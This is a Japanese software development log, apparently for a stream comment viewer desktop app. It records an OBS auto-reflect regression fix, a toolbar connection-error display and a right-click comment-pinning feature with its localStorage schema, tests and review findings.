窓が開く」隠れた副作用へ変質していた＝045b が作った回帰。

窓を開く経路を削除し、ON は**設定を立てるだけ**にした。実際の反映は表示 ON 時に `handleOverlayToggle` が行う
（既存コードで対応済み・無変更）。既に表示中に ON にした場合だけ猶予なしで即反映する。
「表示（開閉）が主・自動反映は従」という親 045 の線引きに UI もロジックも揃った形。

セキュリティ的にも後退しない（**むしろ改善**）: ①ユーザー操作なしに窓が開く経路が 1 本減る ②OBS への接続契機が
表示 ON の明示操作だけになる。宛先は loopback `127.0.0.1:4455` のまま不変（§1・044a の例外条件を維持）。

### ② OBS に接続できなくても本体画面が無反応

045b レビューで指摘し、`CommentViewerApp.tsx` に再修正トリガー（「実機で自動反映 ON かつ OBS 未起動を試して
困ると確認できたとき」）をコメント化していた件が、E2E で**発火**した。`obsState` は `SettingsView` のカードにしか
描画されておらず、表示トグルがツールバーへ出た 045b 以降は「押した画面に何も出ない」状態だった。

`toolbarActions` の先頭（表示トグルの左）に、`obsAutoAdd` が ON のときだけ状態を出す:

| `obsState` | 表示 | クラス |
|---|---|---|
| `failed` | `OBSに接続できませんでした`（`title` に全文） | `.toolbarError`（12px / 700 / `--danger-text`） |
| `connecting` / `added` / `reused` / `idle` | 出さない | — |

- **進行表示（connecting）は一度実装したが実機 E2E で撤回した**。本人要望で「黙って接続中だと UX が悪い」として
  `OBSに接続中…`（`.toolbarStatus` / `--muted`）を出す形で入れたが、成功時はほぼ一瞬で消えるため**チラつき**に
  しかならず、かえって UX が悪化した（本人確認）。進行も成功も出さず、**ユーザーが知る必要があるのは「反映され
  なかった」ときだけ**、という整理に確定。`.toolbarStatus` は未使用になったので CSS ごと削除した。
  再修正トリガー＝接続に体感できる待ちが生じるようになり無反応に見えると分かったとき。そのときは即時ではなく
  **一定時間 connecting が続いた場合だけ**出す遅延表示にする（チラつきを再発させない形）。
- 先頭に置くのは 045b と同じ理由＝右寄せクラスタでは先頭挿入だけが既存要素の画面位置を動かさない。出現/消滅で
  既存トグルがずれない。
- `role="status"` で切り替わりを読み上げさせる（操作は妨げないので alert にはしない）。
- 表示 OFF 時に `setObsState("idle")` を追加。表示 OFF＝OBS 側も非表示なので、直前の結果が残ると実態と食い違う
  （赤字が残留して誤解を生む）。

### ③ 文言（自動反映トグル）

`OBSに自動で反映する` → **`「コメントをOBSに表示」ON時、OBSに自動で反映する`**（本人が (a)(b)(c) から (b) を選択）。
旧 label は**このトグル単体で反映が起きる**とも読め、実際 044a の旧実装もそう動いていた（①）。鉤括弧内は移設先
トグルの label と同一文字列（045a 確定・045b 導線注記と同じ流儀）にして指示語を避けている。
直下の注記は新 label と重複する後半を削り「ONにすると、上の手動でのウィンドウキャプチャ追加が不要になります。」へ。

### CSS: `.toolbarActions` に `flex-wrap` を追加（045b の再検討トリガーが先に成立）

045b では右クラスタ ≈470px が最小幅 560px（`lib.rs:131` の `min_inner_size`）に収まり、溢れても親 `.toolbar` の
`flex-wrap` がクラスタごと 2 行目へ落として吸収できるため CSS 無変更としていた（再検討トリガー＝「実機で溢れたら
`.toolbarActions` に `flex-wrap: wrap` を足す」）。045c のステータス（最長「OBSに接続できませんでした」≈182px）で
クラスタ単体が行幅を超えうるうえ、子は `.switch` も `.toolbarStatus`/`.toolbarError` も `flex: none` で縮まないため、
nowrap のままだと**横溢れする**。`flex-wrap: wrap` + `justify-content: flex-end` + `gap: 8px 12px` を入れ、
折り返した行も右寄せのまま保つようにした。

### テスト（14 files / **150 tests**・146 から +4）

label 追従 2 ファイル（`SettingsView.obs.test.tsx` / `CommentViewerApp.toolbar.test.tsx`）。
`connectCommentStream` のモックを **handlers 捕捉型**に変更し、sidecar からの `obs.state` 通知をテストから
再現できるようにした（捕捉箱は実型 `CommentStreamHandlers` で縛る＝ハンドラ名が変われば typecheck で落ちる）。

新規 4 ケース（`describe("045c 自動反映は表示に従う（E2E 回帰）")`）:
① 自動反映 ON でオーバーレイ窓を開かない（**回帰の本丸**・`enableObs` も出さない・本体へ戻ると表示 OFF のまま）
② 自動反映 ON の状態で表示 ON → 猶予後に `enableObs(4455)`
③ `connecting` / `added` / `reused` / `idle` のいずれでもツールバーに何も出さない（**進行表示を出さない仕様の固定**）
④ `failed` で赤字＋`title` 全文が出て、表示 OFF で消える

③は `/OBS/` の部分一致だと表示トグルの label（「コメントをOBSに表示」）を拾ってしまうため、状態表示の文字列を
名指しで見ている。

**ミューテーション 10 種で確認**（レッドになるべきものが全て独立に 1 ケースずつ落ちる）:
(M1) 旧バグ（自動反映 ON で窓を開く）を復活 → ①のみ fail、(M4) 表示 OFF の `setObsState("idle")` を削除 → ④のみ fail、
(M7) 猶予を撤去して即時呼び出し → ②のみ fail、(M8) 表示 ON 時の連動を削除 → ②のみ fail、
(M9) **撤回した connecting 表示を復活** → ③のみ fail、(M10) failed 表示を削除 → ④のみ fail。
**猶予の長さには非依存**であることも確認（M5: 1200→0 / M6: 1200→4000 のいずれも 150 pass）。044a 自身が
「本待ちは sidecar の有界リトライへ移したので E2E で不要と分かれば撤去してよい」とした調整値なので、秒数を
pin せず「遅延して必ず出る」という契約だけを固定する形にしてある。

### 検証結果

`typecheck` / `lint` pass、`test` pass（**14 files / 150 tests**）。`act()` 警告なし。
`git status -- apps/desktop/src-tauri/ apps/comment-sidecar/` は差分ゼロ。実機での再 E2E は本人環境。

### レビュー対応（2026-07-28・セキュリティ＋品質）

セキュリティ判定は **軽微な懸念あり（修正必須 0 件）**。「接続契機が減った」という主張はレビュー側の実測で追認された:
`openCommentOverlayWindow` の呼び出しは `handleOverlayToggle` の 1 箇所だけになり、`requestObsAutoAdd` の呼び出し元 3 箇所
（表示 ON の猶予後 / 自動反映 ON かつ表示中 / パスワード保存後）はいずれもユーザー明示操作起点。マウント時に走るのは
`isCommentOverlayOpen()` と read-only の `detectObsWebsocketConfig()` のみ。`src-tauri`・sidecar・capabilities・`csp: null`・
依存はいずれも差分ゼロ、新規 `invoke(`/`fetch(`/`new WebSocket`/外部 URL もゼロ（`VOICEVOX_BASE` はモック用リテラル）。

**044a の設計を壊していないことも文書で裏取りされた**: 044a のタスクファイルが規定する連動は「オーバーレイ ON →自動追加」の
**一方向だけ**（044a の 32・51・85 行）で、削除した `else`（自動反映 ON →窓を開く）は**文書に無い実装上の追加**だった。
045c は 044a の設計を壊すのではなく、**文書化された仕様へ実装を戻している**。この整理を親 045 の線引き節にも反映した。

また `setObsState("idle")` の追加は **044a の状態機械と非対称ではない**ことが確認された。sidecar 側の `hide()` / `disable()` も
`onState("idle")` を返す（`obs-client.ts:261,272,277`）ため、viewer の 1 行は**どのみち届く状態の先取り**にすぎず、
WS が落ちて通知が来ない場合にも実態へ合わせられる分だけ堅牢になっている。

**修正した 1 点（回帰・レビュー側が一時テストで再現を実測）**:

- **猶予タイマー（`OBS_ENABLE_DELAY_MS`）を取り消せるようにした**。旧実装は `window.setTimeout` の id を捨てており、
  猶予中に**表示 OFF** / **自動反映 OFF** にしても発火が止まらず、`hideObs` / `disableObs` の**後に** `enableObs` が飛んでいた。
  結果 ①OBS 側で「閉じた窓」のキャプチャソースが再表示される ②**表示トグルが OFF のままツールバーに赤字が出る**
  （＝045c がテスト④で仕様として固定した「表示 OFF で赤字が消える」の反例が作れる）③ユーザーが連携を切った直後に
  loopback 接続要求が出る（§1「明示的に有効化した時のみ」との軽微な乖離）。**044a 由来の既存バグ**で 045c が作ったものでは
  ないが、045c が初めてこの不変条件を明文化し、`obsState` を常時見えるツールバーへ出したことで表面化した。
  `obsEnableTimerRef` に id を保持し、①表示 OFF ②自動反映 OFF ③再度の表示 ON（張り直し前）④アンマウントで取り消す。
  回帰テスト 2 本追加（**14 files / 152 tests**）。ミューテーション（`clearObsEnableTimer()` の呼び出しを全て削除）で
  **この 2 本だけが独立に落ちる**ことを確認済み。

**再修正トリガーをコメント化した 5 点（今回は修正不要）**:

- **`role="status"` の効き方**: aria-live リージョンは「先に DOM にあって中身が後から変わる」ときに読み上げられるのが基本挙動で、
  リージョンごと条件付きマウントする現状では環境により読み上げられない。視覚表示が主目的（配信中に赤字で気付ければ足りる）と
  割り切り role は意味付けとして残す。常時マウント化すると空のときも `.toolbarActions` の gap が 1 つ分入り、トグル位置が
  常時ずれる。トリガー＝スクリーンリーダー利用者から「気付けない」と報告が来たとき。
- **`obsState` を union にしない**: ①同コンポーネントの `sessionState` / `youtubeSessionState` も `useState<string>` で慣習が揃う
  ②ツールバーの `obsState === "failed"` の typo は toolbar テストの failed ケースが落ちる ③受け口
  `CommentStreamHandlers.onObsState` が `(state: string)` なので、ここだけ union にしても境界は守られない。
  トリガー＝viewer/sidecar で状態型を共有する別タスクを起こすとき（中途半端な union 化はしない）。
- **ゲート条件の非対称**: ツールバーは `obsAutoAdd &&` で絞り、設定カードは絞っていない。等価なのは「連携 OFF 時に必ず
  `obsState` を idle へ戻す」という不変条件があるため。トリガー＝`setObsState` の呼び出し箇所が増えて崩れたとき。
- **CSS の効き方の正確な記述**: 560px では実際にはクラスタ内の折り返しより先に親 `.toolbar` の `flex-wrap` が効くため、
  `.toolbarActions` の `flex-wrap` は**二段目の保険**。また「先頭挿入だから既存トグルが動かない」は**1 行に収まる間だけ**成立し、
  折り返す幅ではトグル群が 2 行目へ落ちる。いずれも横溢れはしない側なので許容。
- **テスト③の vacuous 回避**: `emitObsState` の `?.` は捕捉が壊れても黙って no-op になり、否定ケースが「通知が届いていないから
  通る」状態になりうるため、`expect(mocks.handlers.current).not.toBeNull()` を 1 行足した。③の名指しアサートが「別文言の
  進行表示」を素通りさせる点は、防ぎたいのが**撤回した実装の復活**である以上現状で足りるとしてトリガーのみ記載。

**テストの記述粒度も 1 点補正**: ケース②が固定しているのは「猶予の長さ」でも「遅延」でもなく、**`open` の解決と同じ
マイクロタスクでは出さず、タイマー（マクロタスク）を経由して出る**という一点（秒数を 0 にしても 4000 にしても通り、
同期呼び出しに変えたときだけ落ちる＝M5/M6/M7 の結果と整合）。あわせて `toHaveBeenCalledTimes(1)` を足し、二重発火する
ミューテーションを素通りさせないようにした。

**docs の食い違いも 2 点解消**: `task-board.md` の「ミューテーション 8 種」→ **10 種**（progress.md 側が正）、
本節の見出し「ツールバーに OBS 連携ステータス」→ **「ツールバーに OBS 接続エラー」**（connecting 撤回後の実態に合わせる）。
045c にタスクファイルが無い件は、E2E 由来の即時修正として妥当と判断しつつ、**設計判断（044a の連動の一方向を切る）を
親から辿れるように親 045 の子タスク表と線引き節へ 045c を追記**した（タスクファイルは起こさない）。

レビュー対応後の検証: `typecheck` / `lint` pass、`test` pass（**14 files / 152 tests**・回帰テスト 2 本追加）。`act()` 警告なし。
`git status -- apps/desktop/src-tauri/ apps/comment-sidecar/` は差分ゼロのまま（対応も frontend に閉じている）。

## 2026-07-28 (046a コメビュ本体のコメント固定: 右クリック→上部固定＋ピンストア)

配信者が流れていくコメントを見失わないよう、**右クリックで選んだコメントを本体上部に固定**できるようにした
（親 [046](tasks/046-pinned-comment-overlay.md) の要望③前半）。固定内容は **046b の固定専用オーバーレイ窓が読むための
ピンストア（localStorage の 1 キー）**にも保存する。**046a が唯一の書き手・046b は読み手**。

**frontend のみ**。Rust / sidecar / capabilities / `tauri.conf.json`（`csp: null`）/ `package.json` はいずれも**差分ゼロ**で、
新規の外部通信宛先・WS・Rust emit・依存はゼロ。固定コメント（本文・名前・金額）は **Rust の DB / ログに出さず外部送信もしない**
（§9・`recordComments` 等の保存経路には流していない）。追加コードに `console.log` は無い。

### ピンストアの JSON スキーマ（**046b が読む契約・省略しない**）

```
key   : "stream-dock.comment-viewer.pinned-comments"
value : JSON 配列。先頭 = 最新の固定。最大 PINNED_LIMIT 件（046a では 1）。
        固定 0 件のときも "[]" を書く（キーは消さない）。

要素 PinnedComment（= CommentViewDto から author.avatar を除いた構造部分集合）:
{
  id:              string,                   // 必須・非空。CommentViewDto.id（重複排除キー）
  source:          "twitch" | "youtube",     // 必須（CommentSource）
  author:          { id: string, name: string },  // 必須。avatar は保存しない
  text:            string,                   // 必須（空文字は可）
  publishedAt:     string,                   // 必須・非空（ISO8601）
  eventType:       "chat"|"superchat"|"membership"|"subscription"|"gift"|"donation"|"jewels",
  monetaryAmount?: string,                   // 任意（例 "1,000 JPY" / "100 bits"）
  monetary?:       { amount: number, currency: string },  // 任意（CommentMonetaryDto 相当）
  monthCount?:     number,                   // 任意（membership / subscription の継続月数）
  giftCount?:      number,                   // 任意（gift の件数）
  tier?:           number,                   // 任意（subscription の階級）
  comboCount?:     number                    // 任意（jewels の連続ギフト回数）
}
```

**046b が使ってよい前提**:

- 読み手は `loadPinned()` をそのまま import してよい（`OverlayApp.tsx` と同じ read-on-mount ＋ `storage` 購読）。
  自窓の書換では `storage` は発火しないが、書き手は本体窓だけなので専用オーバーレイ側では必ず発火する。
- **固定解除は `"[]"` の書込として届く**（キー削除にはしない）。キーを消すと `storage` の newValue が null になり、
  読み手が「未保存」と「解除」を区別できなくなるため。
- `monthCount` / `giftCount` / `tier` / `source` を保存しているので、046b でも `composeEventMessage` の
  「〇〇さんがサブスクを3ヶ月継続しました（Tier1）」等の**要約文言をそのまま再現できる**（本体と同じ文言になる）。
- **`author.avatar` は入っていない**。046b は WS へ繋がない設計＝再取得もできないので、アイコンは
  `CommentList` の 036a フォールバック（頭文字の丸）になる。外部 URL を踏むことは無い（`data:` 始まり以外は画像化しないガードが既存）。
- **スキーマに version 欄は持たない**。046a が唯一の書き手・046b は同一バンドルで同時に配られるため、版ズレが起きるのは
  「古い localStorage が残った新バイナリ」だけで、それは下の要素単位バリデーションで安全に劣化する。
  ラッパ `{v:1, items:[]}` にすると親 046 が明文化した「JSON 配列」からも外れる。
  **将来スキーマを壊す変更が必要になったらキー名を変える**（`...pinned-comments-v2`）＝旧キーは自然に無視される。この方針を契約とする。

### 上限 N = 1（単一ピン）

親 046 の初期案は「固定は複数可・上限 N（例 3）／YouTube の単一ピンより柔軟に」だったが、**依頼者の決定で N=1（単一ピン）**に確定
（「YouTube や Twitch のコメント固定機能のイメージ」）。**親 046 の該当節も書き換えた**（線引きの正は親なので放置すると食い違う）。

- 上限は `pinnedComments.ts` の `PINNED_LIMIT` **1 箇所**に閉じてあり、増やせばストアのクランプ・本体のトグル・固定帯が
  そのまま追随する。**保存形は N に依らず JSON 配列**なので、複数ピンへ広げても 046b の読み手契約は変わらない。
- 新しく固定すると直前の固定を置き換える（`[toPinned(c), ...prev].slice(0, PINNED_LIMIT)`）。並びは **publishedAt 順ではなく固定操作順**
  （配信者の期待に沿う）。クランプは `savePinned`（書込側）と `loadPinned`（読込側・手で書き換えられた場合の防御）の**両方**に置いた。

### `author.avatar` を保存しない判断

036b/036c 以降 avatar は base64 data URI（1 件で数十 KB）。これを保存しない理由:

1. localStorage が溢れると `savePinned` が QuotaExceededError で**黙って失敗**し、「固定が復元しない」という原因の分かりにくい壊れ方をする。
2. `storage` イベントのペイロード（oldValue ＋ newValue）にも毎回載る。
3. 端末に残す表示データは最小限にする（§9 の精神）。**038a で「視聴者メモリにアバター（data URI）は保存しない」と決めた前例**に揃う。

代償は 046b のアイコンがイニシャル丸になること。**アイコンを出したくなってもここを膨らませず、046b 側で
サイズ上限付き avatar 欄を足すか判断する**（その時点で quota の見積りを持てる）。落とす処理は `toPinned()` の 1 箇所だけで、
フィールドを明示列挙しているので **DTO に機密性のあるフィールドが増えても黙って localStorage に載ることはない**。

### 右クリックメニューの実装方式

新規 [`CommentContextMenu.tsx`](../apps/desktop/src/screens/comment-viewer/CommentContextMenu.tsx)（項目 1 個の自作メニュー・新規依存なし）。
`CommentList.tsx` は既に 350 行前後あり、座標・外側クリック・Esc の state/effect を混ぜると読みにくいので切り出した
（同ディレクトリに小さな UI 部品を切り出す前例＝`ConfirmDialog.tsx`）。

- **メニューの開閉 state は `CommentList` が持つ**（`{x, y, comment} | null`）。親へ足した props は `onPin` / `pinnedIds` の 2 つだけ。
  対象コメントを**実体で**保持するので、一覧が自動追従で流れて行の位置が変わっても固定されるのは右クリックした 1 件のまま。
- **`e.preventDefault()`（ネイティブメニュー抑止）はコメント行の `onContextMenu` だけ**で、しかも `onPin` 指定時のみハンドラを付ける。
  ツールバー・入力欄・設定画面などアプリ全体のコンテキストメニューは従来どおり出る。
- **overlay バリアントには一切付けない**（`renderOverlayItem` は非インタラクティブのまま＝OBS 表示は不変）。
- 座標は `position: fixed` ＋ `clientX/clientY` を**定数でクランプ**（`MENU_WIDTH`/`MENU_HEIGHT`）。項目 1 個の固定サイズなので
  `useLayoutEffect` での実測は過剰と判断した。キーボード（Shift+F10 / メニューキー）由来の contextmenu は clientX/Y が 0 で来るため、
  その場合は行の `getBoundingClientRect()` の左下に出す。
- 閉じるのは Esc / メニュー外 mousedown / 項目実行時。右クリックは **mousedown → contextmenu** の順に発火するため、
  メニューを開いた当の mousedown は購読の前に済んでおり「開いた瞬間に自分で閉じる」ことは無い。
- a11y は `role="menu"` / `role="menuitem"` ＋ 開いたら項目へ focus まで。閉じている間は **DOM に出さない**ので、
  「`onSelect` 未指定なら button ロールが 0」という既存仕様（`CommentList.test.tsx`）を壊さない。

### 「固定済みか」の伝え方

`pinnedIds?: ReadonlySet<string>` を追加（既存 `badges?: ReadonlyMap<string, RecordResult>`〔038c〕と**同じ「id で引く任意 prop」の作法**）。
これでメニュー文言を「上部に固定」/「固定解除」で出し分ける。`onPin` は**トグル**で、親が「固定済みなら解除・そうでなければ置き換えて固定」を実装する。
N=1 でも Set 型にしたのは、将来 N を増やしても prop の形を変えなくて済むため。

### 固定帯の配置

新規 [`PinnedCommentBar.tsx`](../apps/desktop/src/screens/comment-viewer/PinnedCommentBar.tsx)。
順序は **ツールバー → クレジット（`ttsEnabled` 時のみ・法的必須表記）→ ENGINE バナー（`role="alert"`）→ 固定帯 → コメント一覧**。
上 2 つの優先度を崩さず、一覧に直結する情報を一覧の直上に置いた。

- **固定 0 件のときは `null` を返す**＝この機能を使わないユーザーには既存レイアウトが完全に不変。
- 長文スパチャ（290 字）を固定しても一覧が潰れないよう `max-height: 22vh; overflow-y: auto`。通常は `.item` 相当の 56〜80px しか削らない。
- 意匠と文言整形は**流用のみ**（`.item`/`.badge`/`.badgeEvent`/`.author`/`.amount`/`.text`/`.eventMessage`／
  `viewerFormat.ts` の `eventLabel`/`displayEventType`/`isMonetaryEvent`/`composeEventMessage`/`providerLabel`）。新規 CSS は
  `.pinnedBar`/`.pinnedItem`/`.pinnedBody`/`.badgePinned`/`.pinnedRemove`/`.contextMenu`/`.contextMenuItem` のみで**役割トークンだけ**を使う。
- 初見/久しぶりバッジ（038c）と combo 回数（043e）は**帯には出さない**（固定は「見失わないための再掲」で、判定バッジや観測値は流れる一覧側の役割）。

### バリデーション方針（`loadPinned`）

- ルート: `JSON.parse` 失敗 or 配列でない → `[]`（丸ごと捨てる）。
- 要素: 必須（id 非空 / source が既知 / author.id・author.name / text / publishedAt 非空 / eventType が既知）を満たさない**要素だけ**捨てる。
- 任意フィールド: 型が合わなければ**そのフィールドだけ** undefined に落として要素は生かす（NaN/Infinity も落とす）。
- **既知の source / eventType は `Record<Union, true>` で持つ**ので、ts-rs 生成の union に値が増えると**キー不足でコンパイルエラー**になる
  ＝検証テーブルが黙って bindings と乖離しない。参照は `=== true` 比較（`in` は prototype の "toString" 等を拾うため使わない）。

### テスト（15 files / **178 tests**・152 から +26）

- 新規 `features/comment-viewer/pinnedComments.test.ts`（18 ケース・`overlaySettings.obs.test.ts` の流儀）:
  単一ピンの既定（`PINNED_LIMIT === 1`）／未保存→`[]`／往復（金額なし種別の monthCount・tier も往復＝要約文言が劣化しない）／
  `PINNED_LIMIT` 超過のクランプ（**保存 JSON の長さも見る**）／手書き書換のクランプ／解除で `"[]"` が残る／
  toPinned が avatar を落とす・保存 JSON に `data:image` も `avatar` も出ない・外部から書かれた avatar は読込で落ちる／
  壊れた JSON・配列でない JSON・必須欠落要素・未知 source/eventType・任意フィールドの型違い／getItem・setItem の例外／機密キーを作らない。
- `CommentList.test.tsx` に 8 ケース追記: 右クリックでメニューが開く（閉じている間は DOM に無い）／項目押下で該当コメントを渡し閉じる／
  `pinnedIds` で「固定解除」に変わる／**`onPin` 未指定なら出ない**／**overlay バリアントでは出ない**／Esc で閉じる／外側 mousedown で閉じる／
  右クリックは `onSelect` を発火させず、左クリックは従来どおり `onSelect` のみ。
- **ミューテーション確認**: `savePinned` / `loadPinned` の `slice(0, PINNED_LIMIT)` を**それぞれ独立に**外すと、
  対応するケースだけがレッドになることを実測（書込側のクランプが読込側のクランプに隠れて vacuous にならないよう、
  保存 JSON の長さを見るアサートを足した）。`act()` 警告なし。

### 検証結果

`typecheck` / `lint` pass、`test` pass（**15 files / 178 tests**）。
`git status --short -- apps/desktop/src-tauri/ apps/comment-sidecar/ apps/desktop/package.json` は**差分ゼロ**
（`cargo check` は Rust 差分が無いため未実行）。実機確認（`tauri dev`）は本人環境。

### 046b 着手時の申し送り

- ピンストアは上のスキーマがそのまま契約。`loadPinned()` を import して read-on-mount ＋ `storage` 購読で読むだけでよい。
- **アイコンはイニシャル丸になる**（avatar 非保存）。意匠を `OverlayComment.module.css` から流用する際はこれを前提にする。
- 固定解除は `"[]"` の書込として届く。`e.key === PINNED_COMMENTS_KEY || e.key === null`（clear() 対策）で拾う。
- **`storage` は「値が変わったとき」だけ飛ぶわけではない**（レビュー指摘 Q-8）。本体窓は
  `useEffect(() => savePinned(pinned), [pinned])` がマウント時にも走るため、**本体窓を開き直すたびに同じ値で
  1 発飛ぶ**（既存 `saveChannel` / `saveObsAutoAdd` と同じ挙動で、固定を一度も使っていなくても `"[]"` が書かれる）。
  `loadPinned()` で読み直すだけなら冪等で無害だが、**「storage が来た＝ピンが変わった」とみなして入場アニメーションや
  効果音を付けると誤発火する**。差分が要るなら前回値と比較すること。
- **削除手段は固定帯の「固定解除」だけ**。`delete_viewer` / `clear_viewers`（038a・SQLite 専用）はこのキーを消さない。
  046b でピンを表示する以上、この非対称は security.md §9 追補（046a）に明記済みなので前提にしてよい。

### 軽レビュー（2026-07-28・実装直後）

**判定: 問題なし（修正必須 0 件）**。タスク範囲を超えた変更なし／型・ビルドエラーなし／OS 操作・ファイル操作・shell 実行なし
（frontend の localStorage のみ）／DB schema と型定義のズレなし（`viewer_comments` には触れていない・ピンストアは端末内 localStorage で
Rust を経由しない）／ユーザーが手動起動したプロセスを停止する経路なし（sidecar・窓の開閉に一切触れていない）。

外部通信宛先・API・capability・依存は不変（`git status --short -- apps/desktop/src-tauri/ apps/comment-sidecar/ apps/desktop/package.json`
が**差分ゼロ**）。固定コメントは `recordComments` 等の DB 保存経路に流しておらず、`console.*` も追加していない（§9）。
`onSelect`（視聴者詳細）と overlay バリアントの非退行はテストで固定（右クリックが `onSelect` を発火させないこと／
`onPin` 未指定なら何も出ないこと／overlay では出ないこと）。

**レビューで直した 2 点**:

- `pinned` の `useState` を **044a のコメントブロックとその対象 state（`obsConfig`/`obsAutoAdd`/`obsState`）の間に挟んでしまっていた**のを、
  ブロックの手前へ移動。コメントと宣言の対応が崩れていた（挙動には影響なし）。
- `PinnedCommentBar` の source→バッジ色の対応が三項演算子で、**`CommentSource` に値が増えても黙って YouTube 色に寄る**状態だった
  （`CommentList` の `SOURCE_CLASS` は `Record<CommentSource, string>` でコンパイルエラーになる）。同じ Record 形式に揃えて非対称を解消。

**後回しでよい改善（コード側に再修正トリガーをコメント化済み）**: 固定は**固定時点のスナップショット**なので、
043e の jewels combo 更新（`mergeComments` が既存行を上書きする唯一の経路）が後から届いても固定側の金額/combo は古いまま。
一覧側では更新が見えるため許容し、追いたくなったら `updated` を拾って `pinned` の同 id を差し替える（保存形は変えなくてよい）。

### security-review ＋ code-review（2026-07-28・軽レビューとは別に実施）

親 046 の子タスク表では 046a を「軽」に置いていたが、依頼者の希望で **security-review と code-review（effort high）を追加実施**した。

**セキュリティ判定: 軽微な懸念あり**（コード側の修正必須はゼロ）。実測で担保した項目:
`git status --short -- apps/desktop/src-tauri/ apps/comment-sidecar/ apps/desktop/package.json pnpm-lock.yaml` が**出力ゼロ**
（capabilities・`tauri.conf.json`〔`csp: null`〕・`lib.rs`・依存すべて不変）／追加 3 ファイルに `fetch`/`WebSocket`/`invoke`/外部 URL/`console.*` が
**ゼロ**／`dangerouslySetInnerHTML`/`innerHTML`/`background-image`/`<img>` が**ゼロ**（固定帯はアイコンを描かないので 036a の
「webview が踏むのは data URI のみ」ガードは無傷）／CSS に生 hex/rgba **ゼロ**／`comment-viewer` は label 単一（`get_webview_window` で再利用）
なので「書き手は本体窓のみ」が成立／`parsePinned` は prototype 汚染耐性あり（`SOURCES["__proto__"]` は `Object.prototype !== true` で弾かれる）。

**最重要の指摘＝security.md を変更しなかった判断は誤り（対応済み）**。既存の localStorage キー（テーマ/フォント/トグル/チャンネル名/話者 id）は
**すべてユーザー自身の UI 設定値**で、`overlaySettings.ts` 自身が「非機密の UI 設定値」と定義している。今回保存するのは
**第三者のコメント本文・表示名・投げ銭金額**＝データの class が変わっており、038a が「保存先ではなく保存するデータの種類」を
理由に限定解禁した前例に照らせば §9 の対象。よって **`docs/security.md` §9 に「追補（046a・固定コメントの端末内 localStorage 保存）」を新設**し、
「レビュー必須条件」の「取得コメント・視聴者情報の端末保存」に**保存先を問わない**旨を追記した。親 046 の
「localStorage の**非機密 UI データ**」という記述（この誤ったラベリングが「軽レビューで足りる」の根拠になっていた）も訂正した。

**具体的な実害として拾えた点**: 038a はプライバシー担保として削除手段（`delete_viewer` FK CASCADE / `clear_viewers`）を必須条件にしているが、
**どちらも localStorage を触らない**。視聴者メモリから視聴者を削除しても、その人の固定コメント（氏名・本文・金額）は固定解除するまで端末に残る。
上限 1 件かつ固定中は常時画面に出るので取り残しは起きにくいが、**端末内保存データの一括削除・エクスポートを作る際に取りこぼす**ため
security.md・親 046・046b 申し送りの 3 箇所に明記した（連動削除の実装は別タスク。CLAUDE.md「1 回の作業で複数機能をまとめない」に従う）。

**ミューテーション実測で判明したテストの穴（対応済み）**: 実装直後の自己確認は `slice(0, PINNED_LIMIT)` しか試していなかった。
レビューで 3 つのミューテーションを実際に適用して回したところ、**いずれも 178/178 グリーンのまま素通り**した:

| ミューテーション | 対応前 | 対応後 |
|---|---|---|
| `onContextMenu` の `e.preventDefault()` 削除 | **素通り** | **レッド**（`fireEvent.contextMenu` の戻り値＝`defaultPrevented` を assert） |
| `toPinned` をスプレッド `{...c, author:{id,name}}` へ | **素通り** | **レッド**（保存 JSON の**キー集合**を固定。avatar だけ見るケースはスプレッドでも通ってしまう） |
| 画面端クランプ（`Math.max/min`）削除 | 素通り | 素通り（jsdom の `innerWidth=1024` で clamp が発火しない。優先度低として据え置き） |

とくに後者 2 つは「**この行だけネイティブメニューを抑止する**」「**DTO にフィールドが増えても黙って localStorage に載らない**」という
**セキュリティ上の主張そのもの**が 1 つもテストで守られていなかったもの。`CommentViewDto` は ts-rs 自動生成でフィールドが増える型なので、
キー集合の固定は今後効き続ける。

**修正した品質指摘**:

- **`PinnedCommentBar` に単体テストを新設**（7 ケース）。「`CommentViewerApp` 統合は WS/TTS 依存で重い」という整理は
  `PinnedCommentBar` 単体（props → JSX・state も副作用も無し）には当てはまらず、軽レビューで直した回帰
  （`SOURCE_CLASS` の Record 化）を守る層が無かった。0 件で `null` / `onUnpin` の id / 金額種別の整形 /
  `monthCount`・`tier` を保存している効果（要約文言が劣化しない）/ 038c・043e を帯に出さない、を固定。
  ※ただし「三項演算子だと `CommentSource` に値が増えても YouTube 色に寄る」問題は**コンパイル時のキー不足エラー**が
  担保するもので、union に第 3 の値が無い以上ランタイムテストでは捕まえられない（ミューテーション実測で確認）。
  テスト側にその旨を注記し、型で守る箇所と割り切った。
- **メニューを閉じたときのフォーカス復帰**（a11y）。項目が unmount されるとフォーカスが `<body>` へ落ち、
  Shift+F10 → Esc したキーボード利用者が一覧の先頭から Tab し直しになっていた。`role="menu"` を名乗る以上
  呼び出し元へ返すのが WAI-ARIA menu パターンの期待挙動。`CommentContextMenu` がマウント時の `document.activeElement` を
  控えて cleanup で戻す方式（`CommentList` 側の変更ゼロ）。**外側クリックで閉じたときだけは戻さない**
  （押した先へフォーカスが移るのが自然なため）。副次効果として「入力中に右クリックするとカーソルを失う」問題も解消。テスト 2 件追加。
- **`MENU_WIDTH`(=160) と CSS の不一致**。`.contextMenu` は `min-width: 140px` で定数と別々に生きており、
  項目の文言を長くすると実幅が 160 を超えて右端クランプが効かなくなる（画面外へはみ出す）状態だった。
  CSS を `width: 160px` に固定し、両側に「対で直すこと」と注記。

**修正不要と判断しコメント化した指摘**: ①メニューを開いたまま窓をリサイズしてもクランプが再計算されない
（一過性 UI で最悪でも画面外に出るだけ・resize 購読を増やさない／再修正トリガー＝項目が増えて滞在時間が長くなったら）
②`savePinned` の失敗握りつぶし（既存慣習・avatar 抜きの数 KB なので quota 超過は非現実的／再修正トリガー＝046b 実装後に
「本体には出るが OBS に出ない」の切り分けが要るなら失敗を返す口を足す）③未知 `eventType` の要素を丸ごと捨てる選択
（`source` を捨てる必要があるので扱いを揃えた。代償は前方互換なし＝新版で固定→旧版へ戻すと消える／再修正トリガー＝
ロールバック配布が要件になったら eventType だけ生かす）。

**据え置きの再確認（コメント既存）**: 一覧スクロールにメニューが追随しない件は、`onScroll` で閉じる案が
`useFollowScroll` の自動追従と衝突して**コメント流入中にメニューが即閉じる**ため現状が正しい。
クランプの二重化（save/load）も守備範囲が違う（自窓の書込 vs 手書き改ざん・旧版が書いた値）ので寄せない。

**docs の整合**: progress.md の JSON スキーマは実装（`toPinned`/`parsePinned`/bindings）と**厳密一致**を確認済み（046b が読む契約として使える品質）。
